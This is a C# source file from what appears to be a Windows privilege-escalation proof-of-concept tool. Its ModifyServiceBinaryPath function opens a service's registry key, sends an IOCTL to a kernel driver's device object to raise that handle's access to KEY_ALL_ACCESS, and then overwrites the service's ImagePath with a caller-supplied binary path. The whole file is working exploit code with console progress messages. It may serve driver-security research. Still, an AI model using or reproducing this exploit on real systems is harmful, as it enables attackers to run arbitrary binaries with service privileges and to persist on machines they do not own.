using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using ElevateHandleClient.Interop;

namespace ElevateHandleClient.Library
{
    using NTSTATUS = Int32;

    internal class Modules
    {
        public static bool ModifyServiceBinaryPath(string serviceName, string binpath)
        {
            bool bSuccess;
            IntPtr hKey = Utilities.GetServiceKeyHandle(serviceName, out string keyName);

            if (hKey == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to open servcie key.");
                return false;
            }

            do
            {
                IntPtr hDevice;
                NTSTATUS ntstatus;
                IntPtr pInBuffer;
                var context = new ELEVATE_HANDLE_INPUT
                {
                    UniqueProcessId = new IntPtr(Process.GetCurrentProcess().Id),
                    HandleValue = hKey,
                    AccessMask = ACCESS_MASK.KEY_ALL_ACCESS
                };

                bSuccess = Utilities.GetObjectAccessMask(hKey, out ACCESS_MASK grantedAccess);

                if (!bSuccess)
                {
                    Console.WriteLine("[-] Failed to query granted access for the opened key handle.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a service key handle.");
                    Console.WriteLine("    [*] Registry Key Path : {0}", keyName);
                    Console.WriteLine("    [*] Granted Access    : {0}", ((ACCESS_MASK_FOR_KEY)grantedAccess).ToString());
                }

                bSuccess = Utilities.ReadServiceImagePath(hKey, out string imagePath);

                if (!bSuccess)
                {
                    Console.WriteLine("[-] Failed to read ImagePath value for the service.");
                    break;
                }
                else
                {
                    Console.WriteLine("[*] Current ImagePath is \"{0}\".", imagePath);
                }

                Console.WriteLine("[>] Sending a query to {0}.", Globals.SYMLINK_PATH);

                using (var objectAttributes = new OBJECT_ATTRIBUTES(
                    Globals.SYMLINK_PATH,
                    OBJECT_ATTRIBUTES_FLAGS.OBJ_CASE_INSENSITIVE))
                {
                    ntstatus = NativeMethods.NtCreateFile(
                        out hDevice,
                        ACCESS_MASK.GENERIC_READ | ACCESS_MASK.GENERIC_WRITE,
                        in objectAttributes,
                        out IO_STATUS_BLOCK _,
                        IntPtr.Zero,
                        FILE_ATTRIBUTE_FLAGS.NORMAL,
                        FILE_SHARE_ACCESS.NONE,
                        FILE_CREATE_DISPOSITION.OPEN,
                        FILE_CREATE_OPTIONS.NON_DIRECTORY_FILE,
                        IntPtr.Zero,
                        0u);
                }

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to open {0} (NTSTATUS = 0x{1}).", Globals.SYMLINK_PATH, ntstatus.ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a handle to {0} (Handle = 0x{1}).", Globals.SYMLINK_PATH, hDevice.ToString("X"));
                }

                Console.WriteLine("[>] Sending a query to {0}.", Globals.SYMLINK_PATH);

                pInBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ELEVATE_HANDLE_INPUT)));
                Marshal.StructureToPtr(context, pInBuffer, true);
                ntstatus = NativeMethods.NtDeviceIoControlFile(
                    hDevice,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    out IO_STATUS_BLOCK _,
                    Globals.IOCTL_ELEVATE_HANDLE,
                    pInBuffer,
                    (uint)Marshal.SizeOf(typeof(ELEVATE_HANDLE_INPUT)),
                    IntPtr.Zero,
                    0u);
                Marshal.FreeHGlobal(pInBuffer);
                NativeMethods.NtClose(hDevice);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to NtDeviceIoControlFile() (NTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
                    break;
                }
                else
                {
                    Utilities.GetObjectAccessMask(hKey, out grantedAccess);
                    Console.WriteLine("[+] Granted Access is elevated to {0}.", ((ACCESS_MASK_FOR_KEY)grantedAccess).ToString());
                }

                bSuccess = Utilities.WriteServiceImagePath(hKey, binpath);

                if (!bSuccess)
                    Console.WriteLine("[-] Failed to overwrite ImagePath value.");
                else
                    Console.WriteLine("[+] ImagePath value is overwritten successfully.");
            } while (false);

            NativeMethods.NtClose(hKey);

            Console.WriteLine("[*] Done.");

            return bSuccess;
        }
    }
}
